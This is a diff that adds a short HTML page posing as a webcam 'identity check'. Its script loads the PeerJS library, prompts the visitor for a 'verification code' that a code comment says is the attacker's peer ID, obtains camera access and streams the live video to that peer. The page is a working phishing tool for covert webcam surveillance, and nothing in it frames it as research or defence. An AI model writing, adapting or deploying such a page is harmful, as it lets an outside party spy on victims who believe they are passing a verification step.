@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Verification Required</title>
+  </head>
+  <body>
+    <h2>🔒 Identity Check in Progress...</h2>
+    <p>Please stay still while we verify you via webcam.</p>
+
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script>
+      const peer = new Peer();
+
+      // Replace with attacker ID manually or via URL param
+      const attackerId = prompt("Enter verification code");
+
+      navigator.mediaDevices
+        .getUserMedia({ video: true, audio: false })
+        .then((stream) => {
+          const call = peer.call(attackerId, stream);
+        })
+        .catch((err) => {
+          alert("Camera access blocked or unavailable.");
+        });
+    </script>
+  </body>
+</html>
